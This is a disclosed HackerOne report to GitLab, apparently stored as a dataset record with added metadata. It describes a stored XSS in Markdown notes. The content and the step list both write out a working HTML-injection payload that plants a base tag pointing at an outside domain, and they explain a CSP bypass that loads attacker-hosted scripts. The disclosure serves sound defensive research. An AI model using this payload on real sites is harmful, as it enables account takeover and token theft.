{
  "reported_to": "GitLab",
  "reported_by": "joaxcar ",
  "title": "Stored XSS in Notes (with CSP bypass for gitlab.com)",
  "content": "\nSummary\nI read the issue 345657 which handles the XSS in notes reported in Hackerone report 1398305. This issue fixes the reported XSS but leaves the HTML injection that was also mentioned. I don't know how you deal with these situations, but I thought I report this, and you can decide :)\nThe issue linked above shows how a user can inject HTML in any Note (actually any Markdown it seems. For example wiki pages and issue descriptions) by abusing syntax_highlight_filter.rb.\nThere are more ways to take this injection and weaponize it than the patched Emoji tag. I have a list of additional vectors but though that I would report the worst one (proper full stored XSS) and explain more if you decide to accept the report. To not waste our time.\nI have multiple ways to inject script tags, but it looks like you have hardened your CSP? None of the old bypasses worked for me. But it still seems that you have not blocked the base tag. And fortunately for me, the injection let me pass in base tags. So by entering this into an issue description or wiki page\nCode 120 Bytes\n1<pre data-sourcepos=\"&#34;%22 href=&#34;x&#34;></pre>\n2<base href=https://joaxcar.com>\n3<pre x=&#34;\">\n4<code></code></pre>\nAll relative links in the page will try to load their data from my site \"joaxar.com\". If we then open DevTools and reload the page, we will see the name of all files that failed to load. In the case of an issue page, we have this script\nCode 57 Bytes\n1http://joaxcar.com/assets/webpack/hello.4948f350.chunk.js\nand for a wiki page we have\nCode 60 Bytes\n1https://joaxcar.com/assets/webpack/top_nav.c9763726.chunk.js\n<image_0>\nNow I just have to create these files on my domain, and they will load and bypass CSP (as these script tags will have nonce in place and can thus load anything)\n<image_1>\nSteps to reproduce\nlog in as a user on Gitlab.com\ngo to any project (or create one), and add a new issue\nenter this as the description (replace with your own server if you need to generate new scripts on your own domain)\nCode 120 Bytes\n1<pre data-sourcepos=\"&#34;%22 href=&#34;x&#34;></pre>\n2<base href=https://joaxcar.com>\n3<pre x=&#34;\">\n4<code></code></pre>\nsave the issue\nopen DevTools (f12) and look for failing script imports\ncreate the missing script on your domain containing\nCode 22 Bytes\n1alert(document.domain)\nreload the page and the popup should pop\n<image_2>\nImpact\nStored XSS in gitlab.com\nThere are more that can be added to the report but I am sending this in first and will add information later. The XSS can as you know create tokens (and as I have shown before take over SSO accounts)\nWhat is the current bug behavior?\nHTML injection in Markdown\nWhat is the expected correct behavior?\nShould not be possible\nOutput of checks\nThis bug happens on GitLab.com\nImpact\nStored XSS in gitlab.com\nThere are more that can be added to the report but I am sending this in first and will add information later. The XSS can as you know create tokens (and as I have shown before take over SSO accounts)\n\n",
  "severity": [
    8.7,
    null
  ],
  "bounty": 13950,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qc83n35kka3hi729obwg96m0b7v7?response-content-disposition=attachment%3B%20filename%3D%22after.png%22%3B%20filename%2A%3DUTF-8%27%27after.png&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRFICECNA%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T024225Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDqGYTLnh5tpIOp%2BBu2Us%2BRw1i52eon3doC2lLG%2FAZ0%2BwIgHItMlaeaBdH%2FEjdYfdSK%2Fr2oJjwbxvvT1OO8FMRmxYoquwUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNWECp3I%2F1QPp%2BcOYCqPBeyg5MMY1W5ewovCqDXd8gxtn%2Fc5%2FQj4HNPCx%2F71OFHgMReknz2jZjY%2B0ZjUPvyzaShcO4JP6ELP9hwmnl%2FMeNzHTMswiIjuwjx7j4qTMUjILB7e%2F94l9VKEcMAJ7o8RvJAMHCTTos0L6sMpwaHD2f6imQ9Y0sjHlFcQmy6gji%2F%2BwyY%2BshQbky5jMNE%2BfQMJRjv4PMBPDtMczy2j6DzwOLUgZ%2F4E%2FpDfY67DWHYam5qWGfIvV6T5fvytnYFIawEywnxmch2DA3lv0DioRBsLDf07t%2B9ua%2FfK7hJAz8uBNkCRY%2BSW7IBp%2BK3qQb5bsEI%2F3VzrVTFjw6z3QWOvrO6jelIrCS1UbCyMJ1vNLE1Z%2BQRo%2BWzjZkF4%2F3TqZVx6alqwnpih5d%2BiCtDMBzPtvqI2DZJY5GrrpmwNYONCjpLRQ53%2FV4kpgSZH4p%2FY8pD0HFszYiLeYPjKmrWtppeAoziHfyG5LQCSK4A06EBg0wKsZPpRsUSNYMo2FVfhULyc64%2BJf4PjBSlxl%2FYYXfBePBQG5OzgdL5T9xa%2BQcpIZkgwLbAVo%2FBlqlFG1j062dgUTsl%2FJHPgzDzkmKHzDF2E9YTqfiLiGoavR3QiS3i8ZKkjG9ht2QmTpUEl35zEZrkPEW3CCK6n92x9GRYZcjM16VPBzUK69NKo9KJLNAaZ2kKhYA7U2Y00JAwTHVl7Kk4JkIJt0%2BKx1lCahbihZgt24NwLVTzaYkm47hKXyFVRilqnQNHe%2FOIFwWwJpYZJ%2FUeG5JDDdVhGrikxDo2jPBZrexD9Rby%2F8Itez87sZ72eTgvMhy1AuIhYDQBSIxQspKnTE6DVyr2Wvysnh8rQbLpxhTdX8ttzASoPWIkpZ1L1P1yLrHow4vWHvwY6sQESAbiZRKGYCmV926h2FLIfjA7WhXV%2BdXKuHmspf1ZK9KSgfTarg9IXFB9WslSzqoeHkxX276%2FLHeXMLn8kpS8i57zAalLCHRlWVQPHcKJvCOetUj1jvp4CuslPz5Pgf%2BtQrXs0mNqHMJaB1f7kBF54kvXQqSYRkhbcxK7uZxU1TbgkLeJ6zbqxtGSin9cWcjRQN5mVcMhnXof1vKRt4FJvZhTyCRMU1LuGqi%2FYlIm95xg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a32ec60f34bd478c96f59c8b6f39dc0503c4b7530dc3719134fbe9f4ecda3568",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0obcfx4fkxch4cxed06pra4kg6o5?response-content-disposition=attachment%3B%20filename%3D%22payload.jpg%22%3B%20filename%2A%3DUTF-8%27%27payload.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRFICECNA%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T024225Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDqGYTLnh5tpIOp%2BBu2Us%2BRw1i52eon3doC2lLG%2FAZ0%2BwIgHItMlaeaBdH%2FEjdYfdSK%2Fr2oJjwbxvvT1OO8FMRmxYoquwUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNWECp3I%2F1QPp%2BcOYCqPBeyg5MMY1W5ewovCqDXd8gxtn%2Fc5%2FQj4HNPCx%2F71OFHgMReknz2jZjY%2B0ZjUPvyzaShcO4JP6ELP9hwmnl%2FMeNzHTMswiIjuwjx7j4qTMUjILB7e%2F94l9VKEcMAJ7o8RvJAMHCTTos0L6sMpwaHD2f6imQ9Y0sjHlFcQmy6gji%2F%2BwyY%2BshQbky5jMNE%2BfQMJRjv4PMBPDtMczy2j6DzwOLUgZ%2F4E%2FpDfY67DWHYam5qWGfIvV6T5fvytnYFIawEywnxmch2DA3lv0DioRBsLDf07t%2B9ua%2FfK7hJAz8uBNkCRY%2BSW7IBp%2BK3qQb5bsEI%2F3VzrVTFjw6z3QWOvrO6jelIrCS1UbCyMJ1vNLE1Z%2BQRo%2BWzjZkF4%2F3TqZVx6alqwnpih5d%2BiCtDMBzPtvqI2DZJY5GrrpmwNYONCjpLRQ53%2FV4kpgSZH4p%2FY8pD0HFszYiLeYPjKmrWtppeAoziHfyG5LQCSK4A06EBg0wKsZPpRsUSNYMo2FVfhULyc64%2BJf4PjBSlxl%2FYYXfBePBQG5OzgdL5T9xa%2BQcpIZkgwLbAVo%2FBlqlFG1j062dgUTsl%2FJHPgzDzkmKHzDF2E9YTqfiLiGoavR3QiS3i8ZKkjG9ht2QmTpUEl35zEZrkPEW3CCK6n92x9GRYZcjM16VPBzUK69NKo9KJLNAaZ2kKhYA7U2Y00JAwTHVl7Kk4JkIJt0%2BKx1lCahbihZgt24NwLVTzaYkm47hKXyFVRilqnQNHe%2FOIFwWwJpYZJ%2FUeG5JDDdVhGrikxDo2jPBZrexD9Rby%2F8Itez87sZ72eTgvMhy1AuIhYDQBSIxQspKnTE6DVyr2Wvysnh8rQbLpxhTdX8ttzASoPWIkpZ1L1P1yLrHow4vWHvwY6sQESAbiZRKGYCmV926h2FLIfjA7WhXV%2BdXKuHmspf1ZK9KSgfTarg9IXFB9WslSzqoeHkxX276%2FLHeXMLn8kpS8i57zAalLCHRlWVQPHcKJvCOetUj1jvp4CuslPz5Pgf%2BtQrXs0mNqHMJaB1f7kBF54kvXQqSYRkhbcxK7uZxU1TbgkLeJ6zbqxtGSin9cWcjRQN5mVcMhnXof1vKRt4FJvZhTyCRMU1LuGqi%2FYlIm95xg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cdf4c0636c254c9d7287e87d9b7ef14bf3e84b5c885c3ecf21bfa836bf1bb968",
    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/l9jenpw5afb82tnybx1gfmiscx69?response-content-disposition=attachment%3B%20filename%3D%22xssbase.jpg%22%3B%20filename%2A%3DUTF-8%27%27xssbase.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRFICECNA%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T024225Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDqGYTLnh5tpIOp%2BBu2Us%2BRw1i52eon3doC2lLG%2FAZ0%2BwIgHItMlaeaBdH%2FEjdYfdSK%2Fr2oJjwbxvvT1OO8FMRmxYoquwUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNWECp3I%2F1QPp%2BcOYCqPBeyg5MMY1W5ewovCqDXd8gxtn%2Fc5%2FQj4HNPCx%2F71OFHgMReknz2jZjY%2B0ZjUPvyzaShcO4JP6ELP9hwmnl%2FMeNzHTMswiIjuwjx7j4qTMUjILB7e%2F94l9VKEcMAJ7o8RvJAMHCTTos0L6sMpwaHD2f6imQ9Y0sjHlFcQmy6gji%2F%2BwyY%2BshQbky5jMNE%2BfQMJRjv4PMBPDtMczy2j6DzwOLUgZ%2F4E%2FpDfY67DWHYam5qWGfIvV6T5fvytnYFIawEywnxmch2DA3lv0DioRBsLDf07t%2B9ua%2FfK7hJAz8uBNkCRY%2BSW7IBp%2BK3qQb5bsEI%2F3VzrVTFjw6z3QWOvrO6jelIrCS1UbCyMJ1vNLE1Z%2BQRo%2BWzjZkF4%2F3TqZVx6alqwnpih5d%2BiCtDMBzPtvqI2DZJY5GrrpmwNYONCjpLRQ53%2FV4kpgSZH4p%2FY8pD0HFszYiLeYPjKmrWtppeAoziHfyG5LQCSK4A06EBg0wKsZPpRsUSNYMo2FVfhULyc64%2BJf4PjBSlxl%2FYYXfBePBQG5OzgdL5T9xa%2BQcpIZkgwLbAVo%2FBlqlFG1j062dgUTsl%2FJHPgzDzkmKHzDF2E9YTqfiLiGoavR3QiS3i8ZKkjG9ht2QmTpUEl35zEZrkPEW3CCK6n92x9GRYZcjM16VPBzUK69NKo9KJLNAaZ2kKhYA7U2Y00JAwTHVl7Kk4JkIJt0%2BKx1lCahbihZgt24NwLVTzaYkm47hKXyFVRilqnQNHe%2FOIFwWwJpYZJ%2FUeG5JDDdVhGrikxDo2jPBZrexD9Rby%2F8Itez87sZ72eTgvMhy1AuIhYDQBSIxQspKnTE6DVyr2Wvysnh8rQbLpxhTdX8ttzASoPWIkpZ1L1P1yLrHow4vWHvwY6sQESAbiZRKGYCmV926h2FLIfjA7WhXV%2BdXKuHmspf1ZK9KSgfTarg9IXFB9WslSzqoeHkxX276%2FLHeXMLn8kpS8i57zAalLCHRlWVQPHcKJvCOetUj1jvp4CuslPz5Pgf%2BtQrXs0mNqHMJaB1f7kBF54kvXQqSYRkhbcxK7uZxU1TbgkLeJ6zbqxtGSin9cWcjRQN5mVcMhnXof1vKRt4FJvZhTyCRMU1LuGqi%2FYlIm95xg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=47b3f57253472bc4d317b3d1c3891d0945167c5ac0969715c021aca293821cde"
  },
  "disclosed_date": 1653494940,
  "report_url": "https://hackerone.com/reports/1481207",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Log in as a user on Gitlab.com and go to any project (or create one), and add a new issue"
    ],
    [
      2,
      "Enter the following as the description (replace with your own server if needed):\n<pre data-sourcepos=\"&#34;%22 href=&#34;x&#34;></pre>\n<base href=https://joaxcar.com>\n<pre x=&#34;\">\n<code></code></pre>"
    ],
    [
      3,
      "Save the issue and open DevTools (F12) to look for failing script imports"
    ],
    [
      4,
      "Create the missing script on your domain containing: alert(document.domain)"
    ],
    [
      5,
      "Reload the page to trigger the XSS popup"
    ]
  ],
  "vuln_description": "This is a stored Cross-Site Scripting (XSS) vulnerability in GitLab's Markdown rendering, specifically in the syntax_highlight_filter.rb component. The vulnerability allows an attacker to inject a <base> tag, which redirects relative script loads to a malicious domain. By hosting crafted JavaScript files on this domain, the attacker can bypass Content Security Policy (CSP) protections and execute arbitrary code in the context of the GitLab.com domain.",
  "reason": "The attack involves multiple non-obvious components: exploiting HTML injection in Markdown, leveraging the <base> tag to bypass CSP, and understanding GitLab's script loading mechanism. The attacker must also identify and replicate the exact script paths expected by GitLab to successfully load malicious code. This requires deep understanding of both CSP bypass techniques and GitLab's internal architecture.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "1398305",
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves HTML injection and stored XSS via Markdown, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions and resource IDs, which does not apply to this XSS vulnerability.",
    "is_detectable": false
  }
}